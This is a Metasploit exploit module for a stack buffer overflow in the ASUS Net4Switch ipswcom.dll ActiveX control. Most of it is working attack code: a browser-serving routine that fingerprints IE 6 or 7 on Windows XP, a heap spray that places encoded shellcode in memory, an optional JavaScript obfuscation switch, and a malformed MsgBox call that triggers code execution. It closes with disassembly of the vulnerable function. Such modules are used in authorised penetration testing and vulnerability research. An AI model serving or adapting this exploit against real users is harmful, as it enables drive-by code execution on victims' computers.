##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info={})
		super(update_info(info,
			'Name'           => "ASUS Net4Switch ipswcom.dll ActiveX Stack Buffer Overflow",
			'Description'    => %q{
					This module exploits a vulnerability found in ASUS Net4Switch's ipswcom.dll
				ActiveX control.  A buffer overflow condition is possible in multiple places all
				because of the poor use of the CxDbgPrint() function, which allows remote attackers
				to gain arbitrary code execution under the context of the user.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Dmitriy Evdokimov', #Initial discovery, poc
					'sinn3r'             #Metasploit
				],
			'References'     =>
				[
					[ 'OSVDB', 'http://osvdb.org/show/osvdb/79438' ],
					[ 'URL', 'http://dsecrg.com/pages/vul/show.php?id=417' ]
				],
			'Payload'        =>
				{
					'BadChars'        => "\x00",
					'StackAdjustment' => -3500,
				},
			'DefaultOptions'  =>
				{
					'ExitFunction'         => "seh",
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					[ 'IE 6 on Windows XP SP3', { 'Max' => '0x40000', 'Offset' => '0x500' } ],
					[ 'IE 7 on Windows XP SP3', { 'Max' => '0x40000', 'Offset' => '0x500' } ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Feb 17 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])
			], self.class)
	end

	def get_target(agent)
		return target if target.name != 'Automatic'

		if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
			return targets[1]  #IE 6 on Windows XP SP3
		elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
			return targets[2]  #IE 7 on Windows XP SP3
		else
			return nil
		end
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		my_target = get_target(agent)

		if my_target.nil?
			print_error("Browser not supported: #{agent.to_s}: #{cli.peerhost}:#{cli.peerport}")
			send_not_found(cli)
			return
		end

		p = payload.encoded
		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
		nops = Rex::Text.to_unescape(make_nops(4))

		spray = <<-JS
		var heap_obj = new heapLib.ie(0x20000);
		var code = unescape("#{js_code}");
		var nops = unescape("#{nops}");

		while (nops.length < 0x80000) nops += nops;
		var offset = nops.substring(0, #{my_target['Offset']});
		var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

		while (shellcode.length < 0x40000) shellcode += shellcode;
		var block = shellcode.substring(0, (0x80000-6)/2);

		heap_obj.gc();

		for (var i=1; i < 0x300; i++) {
			heap_obj.alloc(block);
		}
		JS

		spray = heaplib(spray, {:noobfu => true})

		js = <<-JS
		var obj = new ActiveXObject("ipswcom.IPSWComItf");

		#{spray}

		function generate_padding(d, s) {
			var tmp = d;
			while (tmp.length < s) {
				tmp += tmp;
			}
			var buf = tmp.substring(0, s/2);
			tmp = null;
			return buf;
		}

		var arg1 = generate_padding(unescape("%u4141"), 4);

		var arg2 = "A"; // Expands to 0x0041, helps us to align the stack
		arg2 += generate_padding(unescape("%u4343"), 2680);
		arg2 += unescape("%u4242%u4242");
		arg2 += unescape("%u0d0d%u0d0d");
		arg2 += generate_padding(unescape("%u0d0d"), #{my_target['Max']}-arg2.length);

		obj.MsgBox(arg1, arg2, 2);
		JS

		#obfuscate on demand
		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		html = <<-EOS
		<html>
		<head>
		</head>
		<body>
		<script>
		#{js}
		</script>
		</body>
		</html>
		EOS

		html = html.gsub(/\t\t/, '')

		print_status("Sending html to #{cli.peerhost}:#{cli.peerport}...")
		send_response(cli, html, {'Content-Type'=>'text/html'})

	end

end

=begin
Download:
http://www.softpedia.com/progDownload/ASUS-Net4Switch-Download-203619.html

clsid:1B9E86D8-7CAF-46C8-9938-569B21E17A8E
C:\Program Files\ASUS\Net4Switch\ipswcom.dll

.text:10030523                 push    ecx
.text:10030524                 mov     eax, [ebp+arg_C]
.text:10030527                 mov     [ebp+var_4], eax
.text:1003052A                 cmp     [ebp+var_4], 0
.text:1003052E                 jz      short loc_10030541  <-- uType 10h
.text:10030530                 cmp     [ebp+var_4], 1
.text:10030534                 jz      short loc_10030573  <-- uType 44h
.text:10030536                 cmp     [ebp+var_4], 2
.text:1003053A                 jz      short loc_100305A5  <-- CxDbgPrint
...
.text:100305A5 loc_100305A5:                           ; CODE XREF: MsgBox+1Aj
.text:100305A5                 mov     eax, [ebp+lpText]
.text:100305A8                 push    eax
.text:100305A9                 push    offset aIpsw_alertS ; "[IPSW_alert] = %s"
.text:100305AE                 push    0FFh
.text:100305B3                 call    ds:CxDbgPrint
=end
